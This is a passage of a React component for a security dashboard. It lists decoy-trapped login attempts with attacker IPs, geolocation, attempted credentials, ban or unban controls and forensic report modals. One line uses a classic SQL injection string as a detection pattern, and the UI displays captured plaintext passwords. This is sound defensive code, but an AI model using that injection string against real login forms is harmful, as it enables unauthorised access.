                  const isBanned = (adminSettings.bannedIps || []).includes(cleanIp);
                  const geo = log.country && log.city ? { country: log.country, city: log.city, isp: log.isp || 'Datacenter' } : deriveGeoFromIp(cleanIp);
                  const isSqli =
                    log.threatType === 'sqli' ||
                    log.detail.toLowerCase().includes('sql') ||
                    log.detail.includes("' OR '1'='1");
                  
                  // Extract password from log if not directly attached
                  let displayPassword = log.attemptedPassword;
                  if (!displayPassword) {
                    const matchPass = log.detail.match(/Password:\s*"([^"]+)"/i);
                    const matchPayload = log.detail.match(/payload\s*"([^"]+)"/i);
                    displayPassword = matchPass ? matchPass[1] : matchPayload ? matchPayload[1] : 'wrong_credentials';
                  }

                  let displayUser = log.attemptedUsername;
                  if (!displayUser) {
                    const matchUser = log.detail.match(/Username:\s*"([^"]+)"/i);
                    displayUser = matchUser ? matchUser[1] : 'admin';
                  }

                  return (
                    <tr
                      key={log.id}
                      className={`hover:bg-slate-50/80 transition-colors ${
                        isBanned ? 'bg-rose-50/30' : ''
                      }`}
                    >
                      {/* IP & Location */}
                      <td className="py-3 px-4">
                        <div className="flex items-center gap-2">
                          <span className="font-mono font-bold text-slate-900 text-xs sm:text-sm">
                            {cleanIp}
                          </span>
                          <button
                            type="button"
                            onClick={() => handleCopy(cleanIp)}
                            className="text-slate-400 hover:text-slate-700 p-1 rounded transition-colors cursor-pointer"
                            title="Copy IP Address"
                          >
                            {copiedIp === cleanIp ? (
                              <Check className="w-3.5 h-3.5 text-emerald-600" />
                            ) : (
                              <Copy className="w-3.5 h-3.5" />
                            )}
                          </button>
                        </div>
                        <div className="text-[11px] text-slate-500 flex items-center gap-1.5 mt-0.5">
                          <Globe className="w-3 h-3 text-slate-400 shrink-0" />
                          <span>
                            {geo.city}, {geo.country} &bull; <span className="text-slate-400 font-mono text-[10px]">{geo.isp}</span>
                          </span>
                        </div>
                      </td>

                      {/* Threat Type Badge */}
                      <td className="py-3 px-4">
                        {isSqli ? (
                          <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded-md font-bold text-[10px] uppercase bg-purple-100 text-purple-900 border border-purple-300">
                            <Terminal className="w-3 h-3" />
                            <span>SQL Injection</span>
                          </span>
                        ) : log.eventType === 'cyber_attack_blocked' ? (
                          <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded-md font-bold text-[10px] uppercase bg-rose-100 text-rose-900 border border-rose-300">
                            <ShieldAlert className="w-3 h-3" />
                            <span>Cyber Shield Block</span>
                          </span>
                        ) : (
                          <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded-md font-bold text-[10px] uppercase bg-amber-100 text-amber-900 border border-amber-300">
                            <KeyRound className="w-3 h-3" />
                            <span>Wrong Password</span>
                          </span>
                        )}
                        <div className="mt-1">
                          <span className="text-[10px] text-purple-700 font-bold bg-purple-50 px-1.5 py-0.5 rounded border border-purple-200">
                            🪤 Trapped in Decoy
                          </span>
                        </div>
                      </td>

                      {/* Attempted Username */}
                      <td className="py-3 px-4">
                        <span className="font-mono text-slate-800 bg-slate-100 px-2 py-0.5 rounded font-bold">
                          {displayUser}
                        </span>
                      </td>

                      {/* Attempted Password or Attack Payload */}
                      <td className="py-3 px-4 max-w-xs">
                        <div className="bg-slate-900 text-rose-300 font-mono px-2.5 py-1 rounded-lg text-xs flex items-center justify-between gap-2 overflow-x-auto shadow-inner">
                          <span className="truncate" title={displayPassword}>
                            {displayPassword}
                          </span>
                          <button
                            type="button"
                            onClick={() => handleCopy(displayPassword)}
                            className="text-slate-400 hover:text-white p-0.5 shrink-0 cursor-pointer"
                            title="Copy payload"
                          >
                            <Copy className="w-3 h-3" />
                          </button>
                        </div>
                      </td>

                      {/* Time */}
                      <td className="py-3 px-4 text-slate-500 whitespace-nowrap">
                        <div className="font-mono text-[11px]">
                          {new Date(log.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
                        </div>
                        <div className="text-[10px] text-slate-400">
                          {new Date(log.timestamp).toLocaleDateString()}
                        </div>
                      </td>

                      {/* Status & Actions */}
                      <td className="py-3 px-4 whitespace-nowrap">
                        <div className="flex items-center gap-2">
                          <button
                            type="button"
                            onClick={() => handleOpenReport(log)}
                            className="px-2.5 py-1 bg-slate-900 hover:bg-slate-800 text-sky-300 font-bold rounded-lg text-[11px] flex items-center gap-1.5 cursor-pointer transition-colors shadow-xs border border-slate-700 hover:border-sky-500"
                            title="View full forensic incident report with attack method analysis"
                          >
                            <FileText className="w-3.5 h-3.5 text-sky-400" />
                            <span>Forensic Report</span>
                          </button>

                          {isBanned ? (
                            <button
                              type="button"
                              onClick={() => handleUnbanIp(cleanIp)}
                              className="px-2.5 py-1 bg-slate-200 hover:bg-slate-300 text-slate-800 font-bold rounded-lg text-[11px] flex items-center gap-1 cursor-pointer transition-colors"
                              title="Unban this IP address"
                            >
                              <CheckCircle2 className="w-3 h-3 text-emerald-600" />
                              <span>Unblock IP</span>
                            </button>
                          ) : (
                            <button
                              type="button"
                              onClick={() => handleBanIp(cleanIp)}
                              className="px-2.5 py-1 bg-rose-600 hover:bg-rose-700 text-white font-bold rounded-lg text-[11px] flex items-center gap-1 cursor-pointer transition-colors shadow-xs"
                              title="Ban this IP from the server"
                            >
                              <Ban className="w-3 h-3" />
                              <span>Ban IP Address</span>
                            </button>
                          )}

                          <button
                            type="button"
                            onClick={() => setInspectLog(log)}
                            className="p-1 text-slate-400 hover:text-slate-700 rounded transition-colors cursor-pointer"
                            title="Inspect quick threat packet"
                          >
                            <Eye className="w-4 h-4" />
                          </button>
                        </div>
                        {isBanned && (
                          <span className="inline-block mt-1 text-[10px] font-extrabold text-rose-700 uppercase tracking-wide">
                            ● Blocked at Gateway
                          </span>
                        )}
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        )}
      </div>

      {/* Currently Blacklisted IPs Grid */}
      <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-xs space-y-3">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <Ban className="w-4 h-4 text-rose-600" />
            <h3 className="font-bold text-xs uppercase tracking-wider text-slate-800">
              Active Firewall IP Blacklist ({(adminSettings.bannedIps || []).length})
            </h3>
          </div>
          <span className="text-[11px] text-slate-400">
            These IPs receive HTTP 403 Forbidden connection rejection
          </span>
        </div>

        {(adminSettings.bannedIps || []).length === 0 ? (
          <p className="text-xs text-slate-400 italic py-2">
            No IP addresses currently on the firewall blacklist. Click "Ban IP Address" on any attacker above to permanently block them.
          </p>
        ) : (
          <div className="flex flex-wrap gap-2 pt-1">
            {(adminSettings.bannedIps || []).map((ip) => (
              <div
                key={ip}
                className="flex items-center gap-2 px-3 py-1.5 rounded-xl bg-rose-50 border border-rose-200 text-xs font-mono text-rose-900 font-bold"
              >
                <span>{ip}</span>
                <button
                  type="button"
                  onClick={() => handleUnbanIp(ip)}
                  className="text-rose-400 hover:text-rose-800 cursor-pointer"
                  title="Remove from blacklist"
                >
                  &times;
                </button>
              </div>
            ))}
          </div>
        )}
      </div>

      {/* Inspect Threat Modal */}
      {inspectLog && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/70 backdrop-blur-xs">
          <div className="bg-white rounded-2xl max-w-lg w-full p-6 shadow-2xl border border-slate-200 space-y-4">
            <div className="flex items-center justify-between border-b border-slate-100 pb-3">
              <div className="flex items-center gap-2">
                <ShieldAlert className="w-5 h-5 text-rose-600" />
                <h3 className="font-black text-slate-900 text-sm">
                  Attacker Intrusion Telemetry
                </h3>
              </div>
              <button
                type="button"
                onClick={() => setInspectLog(null)}
                className="text-slate-400 hover:text-slate-600 text-lg font-bold cursor-pointer"
              >
                &times;
              </button>
            </div>

            <div className="space-y-3 text-xs">
              <div className="bg-slate-50 p-3 rounded-xl border border-slate-200 space-y-1 font-mono">
                <div className="flex justify-between">
                  <span className="text-slate-500">Attacker IP:</span>
                  <strong className="text-slate-900">{inspectLog.ip}</strong>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-500">Timestamp:</span>
                  <span className="text-slate-700">{new Date(inspectLog.timestamp).toISOString()}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-500">Threat Classification:</span>
                  <span className="text-rose-600 font-bold uppercase">{inspectLog.threatType || inspectLog.eventType}</span>
                </div>
              </div>

              <div>
                <label className="block text-[11px] font-bold text-slate-600 mb-1">
                  Captured Inbound Payload:
                </label>
                <div className="bg-slate-950 text-rose-300 p-3 rounded-xl font-mono text-xs break-all">
                  {inspectLog.attemptedPassword || inspectLog.detail}
                </div>
              </div>

              <div>
                <label className="block text-[11px] font-bold text-slate-600 mb-1">
                  Full Intrusion Log Detail:
                </label>
                <div className="bg-slate-100 text-slate-800 p-3 rounded-xl text-xs leading-relaxed">
                  {inspectLog.detail}
                </div>
              </div>

              <div className="pt-2 flex flex-wrap justify-end gap-2">
                <button
                  type="button"
                  onClick={() => {
                    const target = inspectLog;
                    setInspectLog(null);
                    handleOpenReport(target);
                  }}
                  className="px-4 py-2 bg-indigo-600 hover:bg-indigo-700 text-white font-bold rounded-xl cursor-pointer text-xs flex items-center gap-1.5 shadow-sm"
                >
                  <FileText className="w-3.5 h-3.5" />
                  <span>Full Forensic Incident Report &rarr;</span>
                </button>
                <button
                  type="button"
                  onClick={() => {
                    handleBanIp(inspectLog.ip);
                    setInspectLog(null);
                  }}
                  className="px-4 py-2 bg-rose-600 hover:bg-rose-700 text-white font-bold rounded-xl cursor-pointer text-xs"
                >
                  Block &amp; Ban This IP
                </button>
                <button
                  type="button"
                  onClick={() => setInspectLog(null)}
                  className="px-4 py-2 bg-slate-200 hover:bg-slate-300 text-slate-800 font-bold rounded-xl cursor-pointer text-xs"
                >
                  Close
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Full Forensic Incident Report Modal */}
      <AttackIncidentReportModal
        report={selectedReport}
        isOpen={isReportModalOpen}
        onClose={() => setIsReportModalOpen(false)}
        onBanIp={(ip) => handleBanIp(ip)}
        isBanned={selectedReport ? (adminSettings.bannedIps || []).includes(selectedReport.ipInfo.ip) : false}
      />
    </div>
  );
};
